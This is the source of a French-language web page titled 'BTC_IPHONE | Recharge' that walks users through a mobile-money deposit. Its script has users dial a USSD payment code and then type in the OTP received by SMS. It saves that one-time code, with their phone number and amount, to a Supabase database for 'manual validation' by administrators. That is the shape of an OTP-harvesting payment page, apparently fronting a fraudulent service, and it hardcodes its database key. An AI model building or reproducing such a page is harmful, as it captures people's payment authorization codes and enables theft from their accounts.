<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BTC_IPHONE | Recharge</title>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --bg-dark: #090b11;
            --bg-gradient: linear-gradient(180deg, #121622 0%, #06070a 100%);
            --card-dark: #121520;
            --orange-primary: #ff6a3d;
            --text-main: #ffffff;
            --text-muted: #6b7588;
            --accent-gradient: linear-gradient(135deg, #ff6a3d 0%, #9a4eff 100%);
        }

        body { 
            margin: 0; 
            font-family: 'Inter', system-ui, -apple-system, sans-serif; 
            background: var(--bg-dark); 
            background-image: var(--bg-gradient);
            background-attachment: fixed;
            color: var(--text-main); 
            padding: 20px; 
        }

        .header { 
            display: flex; 
            align-items: center; 
            margin-bottom: 30px; 
            padding-top: 10px;
        }
        .back-btn { 
            font-size: 24px; 
            color: var(--orange-primary); 
            text-decoration: none; 
            margin-right: 15px; 
            cursor: pointer; 
            font-weight: bold;
        }
        .header h2 {
            margin: 0;
            font-size: 18px;
            font-weight: 800;
            letter-spacing: 0.5px;
        }

        .deposit-card { 
            background: var(--card-dark); 
            border-radius: 24px; 
            padding: 25px; 
            border: 1px solid rgba(255, 255, 255, 0.03);
            box-shadow: 0 15px 35px rgba(0,0,0,0.4); 
        }

        .input-group { 
            margin-bottom: 22px; 
        }

        label { 
            display: block; 
            margin-bottom: 10px; 
            color: var(--text-muted); 
            font-size: 11px; 
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        input { 
            width: 100%; 
            padding: 16px; 
            background: rgba(0, 0, 0, 0.2); 
            border: 1px solid rgba(255, 255, 255, 0.05); 
            border-radius: 14px; 
            color: white; 
            font-size: 15px; 
            box-sizing: border-box; 
            outline: none; 
            transition: 0.2s;
        }
        input:focus { 
            border-color: var(--orange-primary); 
            background: rgba(0, 0, 0, 0.3);
        }

        .btn-pay { 
            width: 100%; 
            padding: 18px; 
            background: var(--accent-gradient); 
            border: none; 
            border-radius: 16px; 
            color: #ffffff; 
            font-weight: 800; 
            font-size: 15px; 
            cursor: pointer; 
            margin-top: 10px; 
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 15px rgba(255, 106, 61, 0.2);
            transition: 0.2s;
        }
        .btn-pay:active { transform: scale(0.97); opacity: 0.9; }
        .btn-pay:disabled { background: var(--text-muted); cursor: not-allowed; box-shadow: none; }

        .btn-green {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.2);
        }

        .note { 
            font-size: 11px; 
            color: var(--text-muted); 
            margin-top: 20px; 
            line-height: 1.6; 
            text-align: center; 
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="header">
    <div class="back-btn" onclick="location.href='account.html'">‹</div>
    <h2>RECHARGER MON COMPTE</h2>
</div>

<div class="deposit-card">
    
    <!-- ÉTAPE 1 : MONTANT ET NUMÉRO -->
    <div id="step1-form">
        <div class="input-group">
            <label>Montant à envoyer (XOF)</label>
            <input type="number" id="amount" placeholder="Entrez le montant exact (Ex: 5000)">
        </div>

        <div class="input-group">
            <label>Le numéro qui va faire le paiement</label>
            <input type="tel" id="phone" placeholder="Numéro de téléphone">
        </div>

        <button class="btn-pay" id="confirmBtn" onclick="genererCodeUssd()">Continuer</button>
    </div>

    <!-- ÉTAPE 2 : CODE USSD ET BOUTON APPEL -->
    <div id="step2-ussd" class="hidden">
        <div class="input-group">
            <label>Code USSD à composer</label>
            <input type="text" id="ussdDisplay" readonly style="text-align:center; font-weight:bold; font-size:18px; color:var(--orange-primary);">
        </div>

        <a id="callBtn" href="#" style="text-decoration:none;">
            <button type="button" class="btn-pay btn-green" onclick="afficherEtapeOtp()">Aller au paiement</button>
        </a>
    </div>

    <!-- ÉTAPE 3 : SAISIE OTP ET CONFIRMATION -->
    <div id="step3-otp" class="hidden">
        <div class="input-group">
            <label>Veuillez saisir le code OTP que vous avez reçu par SMS</label>
            <input type="text" id="otpInput" placeholder="Entrez le code OTP">
        </div>

        <button class="btn-pay" id="verifyBtn" onclick="confirmerDemande()">Confirmer la demande</button>
    </div>

    <p class="note">
        ⚠️ Votre demande sera soumise à l'administration pour vérification et validation manuelle.
    </p>
</div>

<script>
const client = supabase.createClient(
    "https://ycswpdydsgoqplkqtpsd.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inljc3dwZHlkc2dvcXBsa3F0cHNkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ5NjY4MTcsImV4cCI6MjA5MDU0MjgxN30.67bBMdHtcGFIJuZuY_Xd4hBN4hj86JjHVXGN3oPbKMA"
);

let currentDepositId = null;

async function genererCodeUssd() {
    const amount = document.getElementById('amount').value;
    const phone = document.getElementById('phone').value;
    const uid = localStorage.getItem("user_id");
    const btn = document.getElementById('confirmBtn');

    if(!uid) { alert("Session expirée. Veuillez vous reconnecter."); return; }
    if(!amount || amount < 500) { alert("Le montant minimum de dépôt est de 500 XOF."); return; }
    if(!phone || phone.length < 8) { alert("Veuillez saisir un numéro de téléphone valide."); return; }

    btn.disabled = true;
    btn.innerText = "Génération...";

    const ussdCode = `*144*4*6*${amount}#`;

    try {
        const { data, error } = await client
            .from('deposits')
            .insert([{
                user_id: uid,
                amount: parseInt(amount),
                phone: phone,
                ussd_code: ussdCode,
                status: 'pending' // Reste en attente pour l'administrateur
            }])
            .select()
            .single();

        if (error) throw error;

        if (data) {
            currentDepositId = data.id;
        }

        document.getElementById("ussdDisplay").value = ussdCode;
        let encodedUssd = ussdCode.replace('#', '%23');
        document.getElementById("callBtn").href = `tel:${encodedUssd}`;

        document.getElementById("step1-form").classList.add("hidden");
        document.getElementById("step2-ussd").classList.remove("hidden");

    } catch (err) {
        alert("Erreur : " + err.message);
        btn.disabled = false;
        btn.innerText = "Continuer";
    }
}

function afficherEtapeOtp() {
    setTimeout(() => {
        document.getElementById("step2-ussd").classList.add("hidden");
        document.getElementById("step3-otp").classList.remove("hidden");
    }, 500);
}

async function confirmerDemande() {
    const otp = document.getElementById('otpInput').value;
    const verifyBtn = document.getElementById('verifyBtn');

    if(!otp) {
        alert("Veuillez saisir le code OTP reçu");
        return;
    }

    verifyBtn.disabled = true;
    verifyBtn.innerText = "Envoi...";

    try {
        // On enregistre l'OTP fourni par l'utilisateur, mais le statut reste 'pending' pour l'admin
        const { error } = await client
            .from('deposits')
            .update({ 
                otp_code: otp
                // status reste 'pending' par défaut
            })
            .eq('id', currentDepositId);

        if (error) throw error;

        alert("Demande de dépôt transmise avec succès ! En attente de validation par l'administration.");
        window.location.href = "account.html";

    } catch (err) {
        alert("Erreur : " + err.message);
        verifyBtn.disabled = false;
        verifyBtn.innerText = "Confirmer la demande";
    }
}
</script>

</body>
          </html>
